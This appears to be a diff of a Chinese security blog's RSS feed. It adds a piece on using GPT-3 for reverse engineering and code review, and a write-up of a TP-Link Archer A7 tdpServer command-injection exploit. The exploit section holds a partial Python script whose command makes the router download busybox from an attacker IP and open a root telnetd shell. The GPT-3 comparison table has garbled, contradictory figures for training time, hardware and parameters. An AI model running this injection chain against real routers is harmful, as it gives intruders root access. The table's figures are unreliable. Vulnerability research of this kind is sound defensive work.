@@ -7,7 +7,326 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Tue, 05 Aug 2025 14:48:58 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 07 Aug 2025 10:10:43 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>OpenAI在网络安全工具中的非常规应用：逆向工程与代码审查</title>
+        <link>http://localhost:1313/p/openai%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E9%9D%9E%E5%B8%B8%E8%A7%84%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E6%9F%A5/</link>
+        <pubDate>Thu, 07 Aug 2025 10:10:43 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/openai%E5%9C%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E9%9D%9E%E5%B8%B8%E8%A7%84%E5%BA%94%E7%94%A8%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E6%9F%A5/</guid>
+        <description>&lt;h1 id=&#34;down-the-rabbit-hole-unusual-applications-of-openai-in-cybersecurity-tooling&#34;&gt;Down the Rabbit Hole: Unusual Applications of OpenAI in Cybersecurity Tooling
+&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
+&lt;/h2&gt;&lt;p&gt;随着AI技术进入成熟应用期，网络安全领域的低垂果实已被采摘——杀毒引擎集成机器学习模型，攻击者滥用合成媒体实施诈骗。尽管存在炒作和恐吓，OpenAI的GPT-3语言模型仍因其在Black Hat和DEF CON大会上展示的钓鱼工具/反钓鱼工具引发广泛关注。&lt;/p&gt;
+&lt;h2 id=&#34;gpt-3的技术跨越&#34;&gt;GPT-3的技术跨越
+&lt;/h2&gt;&lt;p&gt;Lambda Labs数据显示，GPT-3 API相较前代实现百倍级参数增长：&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;指标&lt;/th&gt;
+          &lt;th&gt;GPT-2&lt;/th&gt;
+          &lt;th&gt;GPT-3&lt;/th&gt;
+          &lt;th&gt;GPT-3 API&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;训练时间&lt;/td&gt;
+          &lt;td&gt;1+周&lt;/td&gt;
+          &lt;td&gt;355年&lt;/td&gt;
+          &lt;td&gt;&amp;lt;1分钟&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;成本&lt;/td&gt;
+          &lt;td&gt;$43k&lt;/td&gt;
+          &lt;td&gt;$4.6m&lt;/td&gt;
+          &lt;td&gt;$0.06/千token&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;数据量&lt;/td&gt;
+          &lt;td&gt;40GB&lt;/td&gt;
+          &lt;td&gt;45TB&lt;/td&gt;
+          &lt;td&gt;可忽略&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;算力需求&lt;/td&gt;
+          &lt;td&gt;32个TPUv3&lt;/td&gt;
+          &lt;td&gt;1个Tesla V100&lt;/td&gt;
+          &lt;td&gt;可忽略&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;代码解析新纪元&#34;&gt;代码解析新纪元
+&lt;/h2&gt;&lt;p&gt;OpenAI推出两大代码相关产品：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;GitHub Copilot：基于GPT-3的代码自动补全工具&lt;/li&gt;
+&lt;li&gt;Codex：通过自然语言指令生成代码的进阶工具&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;早期测试显示GPT-3具备出色的代码解析能力。例如输入JavaScript代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;minions&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Bob&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Kevin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Stuart&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;minions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;模型能准确解释为：&amp;ldquo;该代码初始化包含三个名字的数组，然后将数组打印到控制台&amp;rdquo;。&lt;/p&gt;
+&lt;h2 id=&#34;逆向工程实验&#34;&gt;逆向工程实验
+&lt;/h2&gt;&lt;p&gt;作者尝试将GPT-3应用于汇编代码逆向工程。以Metasploit的RC4加密payload为例：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;原始模型表现&lt;/strong&gt;：将RC4密钥调度算法误判为&amp;quot;打印HELLO WORLD&amp;quot;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;改进方法&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;使用fine-tuning功能在Curie模型上训练&lt;/li&gt;
+&lt;li&gt;构建包含100个Metasploit payload的训练集（50个RC4/50个未加密）&lt;/li&gt;
+&lt;li&gt;训练耗时仅5分钟&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;测试结果：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;RC4识别准确率：80%（4/5）&lt;/li&gt;
+&lt;li&gt;未加密代码识别准确率：60%（3/5）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;代码审查实践&#34;&gt;代码审查实践
+&lt;/h2&gt;&lt;p&gt;使用davinci-instruct模型进行漏洞检测：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@app.route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/search&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;search&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;query&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;results.html&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;模型成功识别出XSS漏洞，并准确定位到危险参数&lt;code&gt;q&lt;/code&gt;。&lt;/p&gt;
+&lt;h2 id=&#34;技术局限&#34;&gt;技术局限
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;语言模型本质限制：不适合密码分析或模糊测试&lt;/li&gt;
+&lt;li&gt;供应链攻击风险：训练数据可能被投毒&lt;/li&gt;
+&lt;li&gt;许可争议：使用GitHub代码作为训练数据的法律问题&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;未来展望&#34;&gt;未来展望
+&lt;/h2&gt;&lt;p&gt;随着GPT-3访问权限放宽，预计将涌现更多AI驱动的安全工具，如：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;集成机器学习的云端反编译器&lt;/li&gt;
+&lt;li&gt;自动化漏洞检测系统&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;（全文完）&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>TP-Link Archer A7漏洞分析与利用：从逆向工程到远程代码执行</title>
+        <link>http://localhost:1313/p/tp-link-archer-a7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E4%BB%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
+        <pubDate>Thu, 07 Aug 2025 06:02:51 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/tp-link-archer-a7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E4%BB%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
+        <description>&lt;h1 id=&#34;环境搭建&#34;&gt;环境搭建
+&lt;/h1&gt;&lt;p&gt;调试和分析主要在路由器环境中进行。通过USB-TTL设备获取路由器交互式shell的方法已有相关指南，这里不再赘述。OpenWRT提供了&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a51&#34; &gt;指南1&lt;/a&gt;和&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a52&#34; &gt;指南2&lt;/a&gt;说明具体操作。&lt;/p&gt;
+&lt;p&gt;对于代码分析，采用了bindiff方法来定位漏洞函数。可从以下链接下载有漏洞和已修复的固件版本：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;修复版本：Archer A7(US)_V5_200220&lt;/li&gt;
+&lt;li&gt;漏洞版本：Archer C7(US)_V5_190726&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;注意Archer C7和A7型号共享大多数二进制文件，因此分析C7或A7固件镜像均可。&lt;/p&gt;
+&lt;h1 id=&#34;bindiff分析&#34;&gt;BinDiff分析
+&lt;/h1&gt;&lt;p&gt;首先从固件中提取MIPS(Big Endian)二进制文件并加载到Ghidra中。按照&lt;a class=&#34;link&#34; href=&#34;%e9%a1%b9%e7%9b%ae%e9%93%be%e6%8e%a5&#34; &gt;BinDiffHelper项目&lt;/a&gt;的说明进行操作，同时下载安装bindiff6。&lt;/p&gt;
+&lt;p&gt;使用Ghidra和Bindiff后，发现几个相似度很低的函数。跟踪这些地址发现，FUN_00414D14似乎指向一个函数，这可能是存在漏洞的函数。&lt;/p&gt;
+&lt;h1 id=&#34;静态分析&#34;&gt;静态分析
+&lt;/h1&gt;&lt;p&gt;根据ZDI网站上的CVE报告描述，漏洞存在于默认监听UDP端口20002的tdpServer服务中。当解析slave_mac参数时，该服务未正确验证用户输入的字符串就直接用于执行系统调用。&lt;/p&gt;
+&lt;p&gt;在反编译代码中搜索slave_mac字符串，发现多个结果。第一个搜索结果中，有多个地方包含slave_mac字符串，其中还包括对FUN_00414d14函数的引用。&lt;/p&gt;
+&lt;p&gt;关键的字符串&amp;quot;tdpUciInterface.c:644&amp;quot;,&amp;ldquo;About to get slave mac %s info&amp;quot;只有一处引用，地址为0x40e7e4。根据Bindiff，这里很可能没有变化或差异。&lt;/p&gt;
+&lt;h1 id=&#34;寻找system调用&#34;&gt;寻找system()调用
+&lt;/h1&gt;&lt;p&gt;根据CVE描述，我们需要寻找攻击者可能控制的system()函数调用。在FUN_00414d14函数中发现了三个system调用，其中一个特别有趣：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;snprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interesting_acStack7432&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1ff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s&#34;&gt;&amp;#34;lua -e &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;require(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;luci.controller.admin.onemesh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;).sync_wifi_specified({mac=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to_be_controlled_acStack4248&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;漏洞利用&#34;&gt;漏洞利用
+&lt;/h1&gt;&lt;p&gt;在这个漏洞函数中，slave_mac值可以控制传递给system()的参数。我们可以通过以下步骤实现利用：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;为MIPS Big Endian设置GDB服务器&lt;/li&gt;
+&lt;li&gt;测试与tdpServer的连接&lt;/li&gt;
+&lt;li&gt;制作有效载荷&lt;/li&gt;
+&lt;li&gt;完整漏洞利用&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;制作数据包&#34;&gt;制作数据包
+&lt;/h2&gt;&lt;p&gt;数据包由16字节的包头和最大0x410字节的JSON有效载荷组成。第一个字节表示tdp版本，这个固件只接受版本1的数据包。&lt;/p&gt;
+&lt;p&gt;数据包校验和计算使用CRC-32算法。校验通过后，有效载荷会使用IV和DecryptKey通过AES_DECRYPT在CBC模式下解密。&lt;/p&gt;
+&lt;h2 id=&#34;命令注入&#34;&gt;命令注入
+&lt;/h2&gt;&lt;p&gt;slave_mac字段用于将字符写入文件p。该字段有17个字符的限制。命令注入工作原理如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-lua&#34; data-lang=&#34;lua&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;lua&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;require(&amp;#34;luci.controller.admin.onemesh&amp;#34;).sync_wifi_specified({mac=&amp;#34; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;INJECT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HERE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#34;})&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们使用printf将字符追加到文件中，通过发送多个数据包构建完整脚本后执行。&lt;/p&gt;
+&lt;h1 id=&#34;完整漏洞利用&#34;&gt;完整漏洞利用
+&lt;/h1&gt;&lt;p&gt;要实现反向shell，可以从我们的机器下载busybox，然后使用telnetd获取反向shell，通过wget命令逐个字符写入文件并执行。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Cipher&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AES&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;zlib&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.0.125&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ATTACKPORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;8090&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;fileName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;COMMAND&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;wget http://&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:8000/busybox-mips -P /tmp;chmod +x /tmp/busybox-mips;/tmp/busybox-mips telnetd -l /bin/sh -p &amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ATTACKPORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;;wget http://&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:8000/index.jpg -P /www;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;完整Python利用代码&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该漏洞允许攻击者在root用户上下文中执行任意代码，危害极大。建议用户及时更新固件版本。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Windows内核对象初始化器实验：绕过对象回调实现进程监控与反调试</title>
+        <link>http://localhost:1313/p/windows%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1%E5%88%9D%E5%A7%8B%E5%8C%96%E5%99%A8%E5%AE%9E%E9%AA%8C%E7%BB%95%E8%BF%87%E5%AF%B9%E8%B1%A1%E5%9B%9E%E8%B0%83%E5%AE%9E%E7%8E%B0%E8%BF%9B%E7%A8%8B%E7%9B%91%E6%8E%A7%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/</link>
+        <pubDate>Thu, 07 Aug 2025 05:24:38 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/windows%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1%E5%88%9D%E5%A7%8B%E5%8C%96%E5%99%A8%E5%AE%9E%E9%AA%8C%E7%BB%95%E8%BF%87%E5%AF%B9%E8%B1%A1%E5%9B%9E%E8%B0%83%E5%AE%9E%E7%8E%B0%E8%BF%9B%E7%A8%8B%E7%9B%91%E6%8E%A7%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/</guid>
